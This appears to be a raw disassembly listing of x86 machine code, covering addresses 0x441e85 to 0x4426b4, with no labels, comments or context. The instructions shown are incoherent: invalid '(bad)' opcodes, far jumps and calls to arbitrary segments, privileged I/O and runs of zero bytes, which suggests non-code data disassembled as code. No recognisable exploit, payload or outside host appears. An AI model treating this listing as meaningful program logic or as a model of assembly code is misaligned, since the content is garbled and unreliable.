  441e85:	test   DWORD PTR [eax-0x6d],0x9be794c3
  441e8c:	loop   0x441ed3
  441e8e:	dec    ebx
  441e8f:	sbb    al,BYTE PTR [eax]
  441e91:	int3   
  441e92:	gs ds retf 
  441e95:	les    ecx,FWORD PTR [ebp+0x3e]
  441e98:	retf   
  441e99:	add    BYTE PTR [eax],al
  441e9b:	add    BYTE PTR [eax],al
  441e9d:	add    ah,bl
  441e9f:	mov    esi,0x145eeb9b
  441ea4:	ret    0x1507
  441ea7:	add    dl,al
  441ea9:	pop    es
  441eaa:	add    eax,0x4d596b58
  441eaf:	retf   
  441eb0:	push   ss
  441eb1:	add    BYTE PTR [ebx],dl
  441eb3:	xor    BYTE PTR [edx-0x1],dh
  441eb6:	lahf   
  441eb7:	mov    DWORD PTR ds:0x75478e74,ecx
  441ebd:	mov    DWORD PTR [edx-0x317b9018],ecx
  441ec3:	cdq    
  441ec4:	call   0xe013:0xa5249c49
  441ecb:	pop    edx
  441ecc:	outs   dx,BYTE PTR ds:[esi]
  441ecd:	int    0xc6
  441ecf:	xor    ecx,DWORD PTR ds:0xfb1d7df9
  441ed5:	inc    ebx
  441ed6:	nop
  441ed7:	or     al,0x57
  441ed9:	bt     ecx,ecx
  441edc:	int3   
  441edd:	pop    edx
  441ede:	push   edx
  441edf:	lea    ecx,ds:0x3ebd54cc
  441ee5:	retf   
  441ee6:	dec    esp
  441ee7:	mov    dl,0xa3
  441ee9:	dec    edi
  441eea:	dec    ebx
  441eeb:	outs   dx,BYTE PTR ds:[esi]
  441eec:	mov    ebx,0x2a6e5b4f
  441ef1:	lea    edi,[ebx]
  441ef3:	xor    ebp,DWORD PTR [ebx-0x2f1c3ef1]
  441ef9:	sbb    bl,BYTE PTR [ebx+0x1b0e23ba]
  441eff:	idiv   DWORD PTR ds:0xc0
  441f05:	add    BYTE PTR [eax],al
  441f07:	or     al,0x95
  441f09:	sbb    al,BYTE PTR [esi-0x5d]
  441f0c:	mov    dl,0x29
  441f0e:	lea    eax,[edx+0x6358ecaa]
  441f14:	stos   BYTE PTR es:[edi],al
  441f15:	ins    BYTE PTR es:[edi],dx
  441f16:	leave  
  441f17:	inc    edi
  441f18:	stos   DWORD PTR es:[edi],eax
  441f19:	xor    eax,ebp
  441f1b:	bound  ebp,QWORD PTR [ebp-0x610263cf]
  441f21:	push   0x9a2b6860
  441f26:	mov    esi,0x1af7c605
  441f2b:	cli    
  441f2c:	xchg   ecx,eax
  441f2d:	test   DWORD PTR [ebx],0xb9f22690
  441f33:	mov    bh,0xbc
  441f35:	cmp    eax,0x8a2ca860
  441f3a:	sti    
  441f3b:	dec    esi
  441f3c:	sub    eax,0x2d45578a
  441f41:	mov    dl,0x5f
  441f43:	fisttp WORD PTR [edx-0x6177a94d]
  441f49:	je     0x441f92
  441f4b:	mov    esi,DWORD PTR [edi]
  441f4d:	aaa    
  441f4e:	xlat   BYTE PTR ds:[ebx]
  441f4f:	mov    bh,ah
  441f51:	outs   dx,DWORD PTR ds:[esi]
  441f52:	jp     0x441fbc
  441f54:	sahf   
  441f55:	add    al,al
  441f57:	or     al,0x98
  441f59:	mov    edx,0x84b28345
  441f5e:	jmp    0x441fa7
  441f60:	mov    bl,0xf7
  441f62:	add    esi,DWORD PTR [esi-0x4f61f14d]
  441f68:	shl    BYTE PTR [esi-0x7e],0x0
  441f6c:	add    BYTE PTR [eax],al
  441f6e:	add    BYTE PTR [eax],al
  441f70:	push   edi
  441f71:	sahf   
  441f72:	xchg   esp,eax
  441f73:	rcl    DWORD PTR [ebx],0x72
  441f76:	sbb    ah,BYTE PTR [edx]
  441f78:	outs   dx,DWORD PTR ds:[esi]
  441f79:	and    DWORD PTR [esi+0x41],ecx
  441f7c:	mov    edx,?
  441f7e:	push   cs
  441f7f:	jmp    0xc684bcad
  441f84:	sbb    DWORD PTR [esi],edx
  441f86:	jbe    0x441fad
  441f88:	xchg   esp,eax
  441f89:	aaa    
  441f8a:	pop    ebx
  441f8b:	mov    ebp,0x60e7011b
  441f90:	retf   
  441f91:	in     eax,dx
  441f92:	xchg   ebp,eax
  441f93:	xor    al,0xf4
  441f95:	xor    al,0x3d
  441f97:	xor    eax,0x6a03011b
  441f9c:	pop    eax
  441f9d:	test   eax,0xf70cea97
  441fa2:	inc    esi
  441fa3:	jo     0x441f60
  441fa5:	std    
  441fa6:	xchg   edi,eax
  441fa7:	add    bh,BYTE PTR [eax-0x735e82cc]
  441fad:	mov    dl,0xe
  441faf:	mov    dl,0x56
  441fb1:	and    BYTE PTR [eax],cl
  441fb3:	mov    edx,0xcd039afe
  441fb8:	mov    edx,0x586a0ef1
  441fbd:	mov    ch,0x45
  441fbf:	scas   eax,DWORD PTR es:[edi]
  441fc0:	sti    
  441fc1:	inc    ebp
  441fc2:	jmp    0x963e570d
  441fc7:	inc    esp
  441fc8:	push   ecx
  441fc9:	pop    edi
  441fca:	add    ch,cl
  441fcc:	sbb    dh,al
  441fce:	sbb    ah,BYTE PTR [eax+0x5b]
  441fd1:	cmc    
  441fd2:	and    eax,0x2e
  441fd7:	add    BYTE PTR [eax],al
  441fd9:	pop    eax
  441fda:	mov    ch,0x95
  441fdc:	outs   dx,DWORD PTR ds:[esi]
  441fdd:	add    BYTE PTR [ebp-0x4aeb1617],bl
  441fe3:	xchg   ebp,eax
  441fe4:	pushf  
  441fe5:	arpl   si,sp
  441fe7:	fld    DWORD PTR [eax]
  441fe9:	aad    0xc5
  441feb:	iret   
  441fec:	add    DWORD PTR [edi],esi
  441fee:	mov    cl,0xe
  441ff0:	add    BYTE PTR [edx+0x29009134],dh
  441ff6:	mov    cl,0x6b
  441ff8:	loopne 0x442021
  441ffa:	xor    cl,dh
  441ffc:	add    al,ch
  441ffe:	cwde   
  441fff:	push   0xffffffe8
  442001:	cmp    eax,DWORD PTR [ebp-0x4cae7cec]
  442007:	pop    ebp
  442008:	push   ss
  442009:	out    0xb5,al
  44200b:	jmp    0xf3f51a0f
  442010:	push   cs
  442011:	ss mov dh,0xe8
  442014:	(bad)  
  442015:	jmp    0x264b13ca
  44201a:	mov    dh,0x11
  44201c:	add    cl,bh
  44201e:	mov    al,0x93
  442020:	xchg   BYTE PTR [ebp-0x4f],ah
  442023:	push   cs
  442024:	add    BYTE PTR [eax+0x78],dh
  442027:	jns    0x441fb2
  442029:	xchg   edx,eax
  44202a:	mov    ss,WORD PTR [eax+0x2a2f9d7b]
  442030:	je     0x442064
  442032:	das    
  442033:	xchg   ebp,eax
  442034:	add    BYTE PTR [ecx-0xe746e50],ch
  44203a:	mov    al,0xe
  44203c:	add    BYTE PTR [eax],al
  44203e:	add    BYTE PTR [eax],al
  442040:	add    BYTE PTR [eax],al
  442042:	and    dh,BYTE PTR [edi+0x39]
  442045:	mov    DWORD PTR [edx],edi
  442047:	inc    ebp
  442048:	jmp    0xcf6bca4c
  44204d:	lea    edx,[edx]
  44204f:	sub    ecx,ebp
  442051:	(bad)  
  442052:	jns    0x442093
  442054:	adc    al,BYTE PTR [eax]
  442056:	jns    0x442008
  442058:	sti    
  442059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44205a:	repnz addr16 push ecx
  44205d:	mov    DWORD PTR [edx],eax
  44205f:	lock jmp 0x516d9a64
  442065:	dec    esp
  442066:	nop
  442067:	js     0x4420b1
  442069:	xchg   BYTE PTR [ebx],cl
  44206b:	(bad)  
  44206c:	or     eax,0xc5229000
  442071:	pop    ss
  442072:	sbb    esp,DWORD PTR [edx]
  442074:	call   0x8cf6:0x8c8a47ff
  44207b:	es cld 
  44207d:	xor    al,0x5f
  44207f:	push   esp
  442081:	rcl    BYTE PTR [ebx],0x62
  442084:	adc    al,BYTE PTR [eax]
  442086:	nop
  442087:	mov    cl,BYTE PTR ds:0x9b109000
  44208d:	xchg   edi,eax
  44208e:	nop
  44208f:	mov    DWORD PTR ds:0x97f15b87,ecx
  442095:	(bad)  
  442096:	and    al,0x8a
  442098:	or     eax,0xeeb90900
  44209d:	test   BYTE PTR [eax],cl
  44209f:	jmp    0x7f98:0x22900012
  4420a6:	add    BYTE PTR [eax],al
  4420a8:	add    BYTE PTR [eax],al
  4420aa:	add    BYTE PTR [eax+0x850d89],dl
  4420b0:	not    BYTE PTR [edx]
  4420b2:	add    BYTE PTR [eax+0x19fbda20],dl
  4420b8:	stc    
  4420b9:	xchg   esi,eax
  4420ba:	inc    edi
  4420bc:	mov    esi,edi
  4420be:	int    0x93
  4420c0:	adc    DWORD PTR [ebx],ebp
  4420c2:	push   DWORD PTR [edi-0x33702177]
  4420c8:	mov    DWORD PTR ds:0xe8cb1300,ecx
  4420ce:	or     al,0xc7
  4420d0:	adc    cl,al
  4420d2:	pop    es
  4420d3:	or     DWORD PTR [ecx-0x33],esp
  4420d6:	xchg   bl,ah
  4420d8:	push   ebp
  4420d9:	xchg   esp,eax
  4420da:	xchg   edi,eax
  4420db:	jo     0x442066
  4420dd:	or     eax,0x8b12db00
  4420e2:	jecxz  0x442074
  4420e4:	mov    dl,0xf7
  4420e6:	add    ecx,edx
  4420e8:	fbstp  TBYTE PTR [edi]
  4420ea:	mov    ebp,0x41a2950c
  4420ef:	xor    DWORD PTR [edx+0x258f5b74],0x6d
  4420f6:	sbb    DWORD PTR [ecx+0x25],esp
  4420f9:	inc    ecx
  4420fa:	mov    DWORD PTR [edx+0x3fc78d0a],esp
  442100:	or     DWORD PTR [eax-0x69293b76],esp
  442106:	out    dx,eax
  442107:	mov    ah,0xf6
  442109:	imul   ebx
  44210b:	dec    ebx
  44210c:	in     al,dx
  44210d:	aaa    
  44210e:	add    al,0x0
  442110:	add    BYTE PTR [eax],al
  442112:	add    BYTE PTR [eax],al
  442114:	pop    ss
  442115:	out    dx,eax
  442116:	jg     0x5381d770
  44211c:	pop    edi
  44211d:	sub    DWORD PTR [eax+esi*1+0xf],ecx
  442121:	fisubr DWORD PTR [esi-0x28]
  442124:	xchg   edi,eax
  442125:	mov    bh,BYTE PTR [edi+0x4c]
  442128:	clc    
  442129:	call   0xd02:0xa3a4535c
  442130:	or     eax,0x9c44eff5
  442135:	jmp    0xb47e:0xb29003ef
  44213c:	enter  0x689a,0xb0
  442140:	pusha  
  442141:	fwait
  442142:	retf   0x34ef
  442145:	div    bh
  442147:	adc    bl,0xa9
  44214a:	int3   
  44214b:	mov    cl,dl
  44214d:	sti    
  44214e:	test   al,0x88
  442150:	mov    dl,0xfc
  442152:	xor    eax,0xb669ff7
  442157:	dec    edi
  442158:	retf   
  442159:	ins    DWORD PTR es:[edi],dx
  44215a:	and    ecx,DWORD PTR [edi+0x5b]
  44215d:	cmp    ecx,DWORD PTR [bx+0x5b]
  442161:	addr16 push cs
  442163:	pushf  
  442164:	or     BYTE PTR [esi+0x2f87a495],cl
  44216a:	pop    ebx
  44216b:	icebp  
  44216c:	and    edx,DWORD PTR [eax]
  44216e:	setae  BYTE PTR [ebx-0x1447f0f0]
  442175:	aas    
  442176:	jmp    0x442186
  442178:	add    BYTE PTR [eax],al
  44217a:	add    BYTE PTR [eax],al
  44217c:	add    BYTE PTR [esp+edi*8+0x6693f1cc],dh
  442183:	fisubr DWORD PTR ds:0x9cda6dd7
  442189:	or     BYTE PTR [esi+0x1d08963d],cl
  44218f:	pop    ss
  442190:	scas   al,BYTE PTR es:[edi]
  442191:	xchg   esp,eax
  442192:	mov    dl,0xe
  442194:	jmp    0xaf08512c
  442199:	xchg   ebx,eax
  44219a:	mov    dl,0xe
  44219c:	jmp    0xeb315434
  4421a1:	dec    edx
  4421a2:	jae    0x4421b4
  4421a4:	jmp    0x6952d43c
  4421a9:	pop    edi
  4421aa:	cwde   
  4421ab:	shr    al,1
  4421ad:	xchg   ebx,eax
  4421ae:	mov    dl,0xe
  4421b0:	jmp    0xa64746e3
  4421b5:	lea    esi,[edx+0x7313e90e]
  4421bb:	push   cs
  4421bc:	jmp    0x9992:0xae0eb293
  4421c3:	jmp    0xce41b5b1
  4421c8:	jg     0x442220
  4421ca:	mov    ch,0x62
  4421cc:	fist   WORD PTR [edx-0x68]
  4421cf:	jmp    0xd1b6b5bd
  4421d4:	jmp    0xe952d467
  4421d9:	fcom   DWORD PTR [esi-0x20]
  4421dc:	sub    eax,DWORD PTR [esi+ebx*1+0x1b]
  4421e3:	add    BYTE PTR [eax],al
  4421e5:	add    BYTE PTR [esi+0x79000eaf],bh
  4421eb:	cmc    
  4421ec:	into   
  4421ed:	add    BYTE PTR [ebx-0x4b],ch
  4421f0:	push   cs
  4421f1:	add    BYTE PTR [eax+esi*8],al
  4421f4:	aad    0xcc
  4421f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4421f7:	jmp    0xccd5:0xeab5ccd5
  4421fe:	cmp    dh,ch
  442200:	mov    edi,?
  442202:	std    
  442203:	les    ebp,FWORD PTR [ebx-0x1]
  442206:	xchg   esi,eax
  442207:	xor    BYTE PTR [edx],0x53
  44220a:	pop    ds
  44220b:	xchg   DWORD PTR [ecx],edx
  44220d:	xor    esp,DWORD PTR [edx+0x2652e888]
  442213:	mov    ds:0xae7d6b71,al
  442218:	xchg   ebx,eax
  442219:	lock mov edx,0x3f8515d9
  44221f:	adc    BYTE PTR ds:0x49a24657,0x12
  442226:	mov    ecx,0xa7c693ae
  44222b:	pop    ecx
  44222c:	stos   BYTE PTR es:[edi],al
  44222d:	mov    DWORD PTR [edi-0x78c16e4e],esp
  442233:	pop    ecx
  442234:	stos   BYTE PTR es:[edi],al
  442235:	int3   
  442236:	and    eax,0x35ccd5f1
  44223b:	icebp  
  44223c:	aad    0xcc
  44223e:	pushf  
  44223f:	sub    ebp,esi
  442241:	mov    ebx,DWORD PTR [esi+ebx*4+0x62e9ec6a]
  442248:	lea    eax,ds:[eax]
  44224b:	add    BYTE PTR [eax],al
  44224d:	add    BYTE PTR [eax],al
  44224f:	ins    BYTE PTR es:[edi],dx
  442250:	neg    BYTE PTR [ecx-0x73]
  442253:	mov    esp,0x3d459504
  442258:	sub    dl,BYTE PTR [esp+edi*8-0x76]
  44225c:	std    
  44225d:	icebp  
  44225e:	xor    DWORD PTR [esi-0x4],eax
  442261:	out    0x8b,al
  442263:	nop
  442264:	dec    esi
  442265:	adc    DWORD PTR [ebp-0x34],edi
  442268:	mov    cs,WORD PTR [esi-0x676efb3a]
  44226e:	inc    edx
  44226f:	test   BYTE PTR [edi],cl
  442271:	dec    esi
  442272:	jae    0x44220c
  442274:	adc    al,0x9f
  442276:	neg    edi
  442278:	cmp    ebx,DWORD PTR [eax-0x67a39bae]
  44227e:	push   edx
  44227f:	pusha  
  442280:	popa   
  442281:	mov    ds:0xdec0c14f,eax
  442286:	inc    ebx
  442287:	or     BYTE PTR [ecx+0xd],0x85
  44228b:	dec    eax
  44228c:	ret    0xf8c0
  44228f:	inc    edi
  442290:	cdq    
  442291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442292:	pop    ecx
  442293:	or     esp,DWORD PTR [edi-0x49bb435a]
  442299:	push   ecx
  44229a:	retf   
  44229b:	pop    esp
  44229c:	pop    esi
  44229d:	push   esi
  44229e:	retf   
  44229f:	push   esp
  4422a0:	inc    esi
  4422a1:	push   esi
  4422a2:	retf   
  4422a3:	dec    esp
  4422a4:	xlat   BYTE PTR ds:[ebx]
  4422a5:	fwait
  4422a6:	jmp    0x442269
  4422a8:	fistp  WORD PTR [ebx+0x4d9c9c72]
  4422ae:	xchg   BYTE PTR [ebp+0x55],cl
  4422b1:	imul   esi,ecx,0x0
  4422b7:	add    BYTE PTR [edx+ebx*4+0x530d099a],al
  4422be:	mov    esi,0xded71b24
  4422c3:	dec    edi
  4422c4:	adc    eax,0xb4f46cf
  4422c9:	(bad)  
  4422ca:	loop   0x442319
  4422cc:	inc    eax
  4422cd:	fiadd  DWORD PTR [edi+0x12]
  4422d0:	push   eax
  4422d1:	jnp    0x4422a0
  4422d3:	dec    DWORD PTR [edx+ecx*2]
  4422d6:	(bad)  [edi]
  4422d8:	mov    edi,0x500d5d76
  4422dd:	mov    DWORD PTR [edx-0x354d8909],edx
  4422e3:	add    eax,0xc25e7275
  4422e8:	xchg   ebx,eax
  4422e9:	sub    edi,DWORD PTR [edx+0x522b3957]
  4422ef:	mov    bh,0x4c
  4422f1:	and    cx,WORD PTR [eax+0x5b]
  4422f5:	cmp    cx,WORD PTR [eax+0x4b]
  4422f9:	data16 mov cl,BYTE PTR [ebx+ebp*2-0x1d737dff]
  442301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442302:	les    eax,FWORD PTR [ebx+0xe]
  442305:	in     eax,dx
  442306:	or     edi,DWORD PTR [edi+0x61]
  442309:	push   ds
  44230a:	(bad)  
  44230b:	mov    WORD PTR [ecx+0x74d02e2d],cs
  442311:	sub    ecx,DWORD PTR [edx-0x4dda2811]
  442317:	push   edi
  442318:	iret   
  442319:	sub    edi,DWORD PTR [edx+0xf3]
  44231f:	add    BYTE PTR [eax],al
  442321:	lds    eax,FWORD PTR [edx]
  442323:	xchg   DWORD PTR [eax-0x7e],ebx
  442326:	(bad)  
  442328:	ret    
  442329:	daa    
  44232a:	cs mov bh,0xce
  44232d:	(bad)  
  44232e:	xchg   edi,eax
  44232f:	jmp    0x784:0xf7f28573
  442336:	shr    BYTE PTR [edx],1
  442338:	push   es
  442339:	mov    ch,0x72
  44233b:	pop    esi
  44233c:	rcl    DWORD PTR [ebx+0x59583a2b],0x2b
  442343:	shl    BYTE PTR [esi+0x47a3662c],cl
  442349:	(bad)  [ebp-0x45]
  44234c:	inc    edi
  44234d:	retf   
  44234e:	sub    cl,BYTE PTR gs:[ebp+0xb6b32eb]
  442355:	bound  ebp,QWORD PTR [ebx]
  442357:	jmp    0xd784:0x68e36107
  44235e:	xchg   esi,eax
  44235f:	push   cs
  442360:	push   0x45
  442362:	call   0xf795:0xf3df7625
  442369:	test   BYTE PTR [ecx+0x62],ch
  44236c:	push   ds
  44236d:	scas   al,BYTE PTR es:[edi]
  44236e:	xchg   edi,eax
  44236f:	call   0x1ab8:0x41e73fac
  442376:	sbb    edi,esp
  442378:	jo     0x4423d8
  44237a:	call   0xe94e:0xa7efd4e9
  442381:	or     dh,cl
  442383:	out    0x6a,al
  442385:	add    BYTE PTR [eax],al
  442387:	add    BYTE PTR [eax],al
  442389:	add    bl,cl
  44238b:	call   0xfb7e:0xd914c963
  442392:	push   ebx
  442393:	xchg   esi,eax
  442394:	call   0x6299f9d7
  442399:	clc    
  44239a:	call   0x47f3bb21
  44239f:	sti    
  4423a0:	lea    esi,[ecx]
  4423a2:	fcom   DWORD PTR [esi]
  4423a4:	aad    0xf6
  4423a6:	clc    
  4423a7:	cs repz mov esp,ss
  4423ab:	cs push ebx
  4423ad:	loope  0x4423ca
  4423af:	add    ebx,ebp
  4423b1:	ds out 0x2e,al
  4423b4:	repz xor al,0xd3
  4423b7:	imul   ebx,edx,0xda69589d
  4423bd:	mov    ch,0x58
  4423bf:	imul   ebx,edx,0xda6948ad
  4423c5:	sbb    al,0xb
  4423c7:	mov    al,BYTE PTR [eax+0x62]
  4423ca:	shr    DWORD PTR [ecx+0x6e13bb1d],0xe9
  4423d1:	fs dec esi
  4423d3:	and    DWORD PTR ds:0x5b2ee662,ecx
  4423d9:	icebp  
  4423da:	adc    cl,BYTE PTR [ebp-0x7a3afff2]
  4423e0:	push   eax
  4423e1:	je     0x4423a6
  4423e3:	pop    sp
  4423e5:	xor    al,BYTE PTR [eax-0x46fff150]
  4423eb:	or     BYTE PTR [ecx],dl
  4423ed:	mov    ecx,0x0
  4423f2:	add    BYTE PTR [eax+0x42000eb1],bh
  4423f8:	mov    al,0x3b
  4423fa:	leave  
  4423fb:	and    al,0xe0
  4423fd:	pop    ebp
  4423fe:	es dec eax
  442400:	sub    BYTE PTR [eax+edx*1-0x4],dl
  442404:	jae    0x442403
  442406:	dec    edi
  442407:	sbb    BYTE PTR [ebx-0x1a],ah
  44240a:	adc    eax,0x29a0d5
  44240f:	cli    
  442410:	mul    dh
  442412:	jne    0x442472
  442414:	cld    
  442415:	cld    
  442416:	(bad)  
  442417:	pop    ebx
  442418:	jno    0x442403
  44241a:	mov    BYTE PTR [edi],ah
  44241c:	xchg   ebp,eax
  44241d:	push   0xffffffc8
  44241f:	sahf   
  442420:	pop    esp
  442421:	inc    esp
  442422:	ret    
  442423:	or     dh,cl
  442425:	inc    edi
  442426:	pop    ebp
  442427:	push   0xffffffea
  442429:	aad    0xcc
  44242b:	adc    al,0x28
  44242d:	cmc    
  44242e:	push   esi
  44242f:	push   es
  442430:	sub    BYTE PTR [esp+ecx*1-0x46],ah
  442434:	out    dx,eax
  442435:	out    0x85,al
  442437:	ds add cl,BYTE PTR gs:[ebx+0x74a93226]
  44243f:	lock pusha 
  442441:	out    0x15,al
  442443:	pop    ecx
  442444:	mov    al,ds:0xe6fa0029
  442449:	ds push 0xffffffe9
  44244c:	sti    
  44244d:	cld    
  44244e:	imul   edx,DWORD PTR [edx+0x72],0xffffffe9
  442452:	xor    BYTE PTR ds:0x8b47a9,0x0
  442459:	add    BYTE PTR [eax],al
  44245b:	add    BYTE PTR [edi],dh
  44245d:	pop    edi
  44245e:	inc    esp
  44245f:	ret    
  442460:	nop
  442461:	(bad)  
  442462:	xchg   ebp,eax
  442463:	jmp    0x442480
  442465:	mov    dh,0x16
  442467:	jge    0x442441
  442469:	sub    ecx,DWORD PTR [esi-0x6b77bb3a]
  44246f:	mov    WORD PTR ds:[esi+0x36dccb4d],?
  442476:	push   ecx
  442477:	retf   
  442478:	aam    0xde
  44247a:	push   ecx
  44247b:	retf   
  44247c:	int3   
  44247d:	(bad)  
  44247e:	push   ecx
  44247f:	retf   
  442480:	les    edx,FWORD PTR [ebp-0x6c]
  442483:	jmp    0x4424a0
  442485:	dec    edi
  442486:	adc    eax,0x21c990c1
  44248b:	cmp    al,0x90
  44248d:	int3   
  44248e:	int    0x3
  442490:	mov    al,0xbe
  442492:	int3   
  442493:	call   DWORD PTR [esi+0x4a]
  442496:	adc    eax,0xd494570
  44249b:	rcl    eax,0x85
  44249e:	dec    ebp
  44249f:	fcmovbe st,st(3)
  4424a1:	mov    DWORD PTR [eax],ebp
  4424a3:	aas    
  4424a4:	mov    al,ds:0x903c2379
  4424a9:	(bad)  
  4424aa:	int    0x13
  4424ac:	and    BYTE PTR [esp+ecx*8-0x1ab5b101],dh
  4424b3:	mov    edi,0xc10d494e
  4424b8:	shr    BYTE PTR [ebp-0x766fffee],1
  4424be:	mov    al,ds:0xbd
  4424c3:	add    BYTE PTR [eax],al
  4424c5:	mov    WORD PTR [ecx+0x35dccb51],cs
  4424cb:	push   esi
  4424cc:	retf   
  4424cd:	aam    0x5d
  4424cf:	push   esi
  4424d0:	retf   
  4424d1:	int3   
  4424d2:	inc    ebp
  4424d3:	push   esi
  4424d4:	retf   
  4424d5:	les    ecx,FWORD PTR [esi]
  4424d7:	lea    edx,[ebx-0x48f27670]
  4424dd:	xchg   BYTE PTR [edx-0x36ffc0a],dh
  4424e3:	jp     0x4424c5
  4424e5:	mov    bl,0xb2
  4424e7:	les    ecx,FWORD PTR [ebp+0x31]
  4424ea:	sub    edi,eax
  4424ec:	add    BYTE PTR [edi],0xaf
  4424ef:	push   ds
  4424f0:	iret   
  4424f1:	ret    0x7525
  4424f4:	mov    WORD PTR [esi-0x7665084e],cs
  4424fa:	mov    dl,0xf7
  4424fc:	add    esi,DWORD PTR [ebp-0x64]
  4424ff:	(bad)  [edx+0x372f6f]
  442505:	dec    edi
  442506:	sbb    eax,0x170d874b
  44250b:	out    dx,al
  44250c:	add    edx,DWORD PTR [eax-0x6ffc3ba7]
  442512:	mov    dl,0x7a
  442514:	loopne 0x4424c9
  442516:	mov    dl,0xe4
  442518:	dec    ebp
  442519:	icebp  
  44251a:	sub    edi,esp
  44251c:	and    BYTE PTR [edi],0xae
  44251f:	sahf   
  442520:	into   
  442521:	bound  ebx,QWORD PTR [edx-0xa]
  442524:	add    edx,DWORD PTR [eax+0x8a99b2]
  44252a:	add    BYTE PTR [eax],al
  44252c:	add    BYTE PTR [eax],al
  44252e:	int    0x3e
  442530:	repz add edx,DWORD PTR [eax-0x4274c821]
  442537:	inc    esi
  442538:	rol    DWORD PTR [ebx],0x90
  44253b:	sub    DWORD PTR [ebp-0x54],esi
  44253e:	xor    DWORD PTR [edx+0x62a58af7],0x299003e9
  442548:	jne    0x4424ed
  44254a:	xor    DWORD PTR [edx+0x664cb5f7],0x65db478b
  442554:	mov    ds:0xbb65cb47,eax
  442559:	inc    edi
  44255a:	retf   
  44255b:	gs push cs
  44255d:	sbb    al,0x19
  44255f:	xchg   DWORD PTR [edi],edi
  442561:	bound  esp,QWORD PTR [ebx-0x1d]
  442564:	add    ch,cl
  442566:	xchg   ebx,eax
  442567:	in     eax,0x40
  442569:	jb     0x442531
  44256b:	stos   BYTE PTR es:[edi],al
  44256c:	xchg   ebp,eax
  44256d:	jne    0x442592
  44256f:	not    DWORD PTR ds:0x1a2793e9
  442575:	mov    edi,0xc2eaf80a
  44257a:	dec    ecx
  44257b:	stos   BYTE PTR es:[edi],al
  44257c:	cdq    
  44257d:	dec    eax
  44257e:	xchg   ebx,eax
  44257f:	mov    dl,0xe
  442581:	in     al,dx
  442582:	xchg   esi,eax
  442583:	sub    eax,0xadb371a2
  442588:	push   cs
  442589:	jmp    0xb5da5c96
  44258e:	cwde   
  44258f:	mov    dl,0xe
  442591:	fiadd  WORD PTR [eax]
  442593:	add    BYTE PTR [eax],al
  442595:	add    BYTE PTR [eax],al
  442597:	adc    al,0xa6
  442599:	mov    eax,ds:0x89ae0cf6
  44259e:	(bad)  
  44259f:	cwde   
  4425a0:	jg     0x4425fe
  4425a2:	rcr    BYTE PTR [esi-0x56],1
  4425a5:	xchg   esp,eax
  4425a6:	push   ebp
  4425a7:	gs jmp 0x71a2:0x3793e902
  4425af:	pop    ds
  4425b0:	mov    bh,0xe
  4425b2:	jmp    0xb1544c60
  4425b7:	aaa    
  4425b8:	xchg   edx,eax
  4425b9:	jmp    0x9615b83c
  4425be:	xor    eax,0xe915ee0b
  4425c3:	xchg   ebx,eax
  4425c4:	aaa    
  4425c5:	inc    ebx
  4425c6:	in     eax,dx
  4425c7:	xchg   ebx,eax
  4425c8:	inc    ebx
  4425c9:	add    bh,BYTE PTR [esi-0x6d]
  4425cc:	inc    ebx
  4425cd:	or     dl,BYTE PTR [esi+0x5bbdc72a]
  4425d3:	aam    0x4
  4425d5:	(bad)  
  4425d6:	popa   
  4425d7:	dec    ecx
  4425d8:	mov    ss,WORD PTR [eax+eax*1+0x1446b875]
  4425df:	jmp    0xffe04699
  4425e4:	pop    ebp
  4425e5:	std    
  4425e6:	(bad)  
  4425e7:	stc    
  4425e8:	imul   esi,DWORD PTR [edi],0xffffff8b
  4425eb:	pushf  
  4425ec:	mov    ss,WORD PTR [eax+0x124259b4]
  4425f2:	add    BYTE PTR [ecx-0x42af65f0],bh
  4425f8:	mov    ch,0xe
  4425fa:	mov    eax,DWORD PTR [eax]
  4425fc:	add    BYTE PTR [eax],al
  4425fe:	add    BYTE PTR [eax],al
  442600:	cmp    BYTE PTR [ecx-0x7243762f],bh
  442606:	and    cl,dl
  442608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442609:	aaa    
  44260a:	xchg   edx,eax
  44260b:	dec    ebp
  44260c:	xor    eax,0xd5b0960f
  442611:	nop
  442612:	jmp    0x92a4fe16
  442617:	in     eax,0x44
  442619:	clc    
  44261a:	xchg   edx,eax
  44261b:	push   ebp
  44261c:	aad    0x11
  44261e:	push   ebp
  44261f:	or     BYTE PTR [edi],dh
  442621:	push   cs
  442622:	jle    0x4425ac
  442624:	adc    eax,0x2ffe990
  442629:	adc    ch,ch
  44262b:	pop    ebp
  44262c:	mov    edx,0x55b0860f
  442631:	nop
  442632:	jmp    0x92a43e36
  442637:	in     eax,0x4
  442639:	clc    
  44263a:	aad    0xcc
  44263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44263d:	repnz aad 0xcc
  442640:	test   edx,esi
  442642:	aad    0xcc
  442644:	gs repnz aad 0xcc
  442648:	or     al,0x10
  44264a:	test   BYTE PTR [ebx+0x5193ad25],0x2d
  442651:	dec    eax
  442652:	xchg   edx,eax
  442653:	sbb    DWORD PTR [edx-0x6f76eeb2],esp
  442659:	into   
  44265a:	dec    edx
  44265b:	test   BYTE PTR [ecx+0xbdba712],ah
  442661:	stos   BYTE PTR es:[edi],al
  442662:	push   ss
  442663:	push   edx
  442664:	add    BYTE PTR [eax],al
  442666:	add    BYTE PTR [eax],al
  442668:	add    BYTE PTR [ecx],cl
  44266a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44266b:	jb     0x4425f1
  44266d:	inc    ecx
  44266e:	xchg   ebx,eax
  44266f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442670:	test   BYTE PTR [ecx+0x6b],ch
  442673:	add    bh,al
  442675:	or     esi,ecx
  442677:	jbe    0x442681
  442679:	pop    ds
  44267a:	dec    edx
  44267b:	push   0xdd3cd1c5
  442680:	add    al,0xda
  442682:	adc    DWORD PTR [esi+0x3b],esp
  442685:	mov    ebx,DWORD PTR [ebx-0x24f778f3]
  44268b:	jmp    0x6655d68f
  442690:	inc    ebx
  442691:	fwait
  442692:	fwait
  442693:	or     eax,0xe8430887
  442698:	call   DWORD PTR [edi-0x64b499ff]
  44269e:	cdq    
  44269f:	or     eax,0xe84a1887
  4426a4:	(bad)  
  4426a5:	jg     0x4426aa
  4426a7:	push   bx
  4426a9:	mov    ebx,DWORD PTR [ecx+0x2218870d]
  4426af:	call   0x66598eb3
  4426b4:	push   ebx
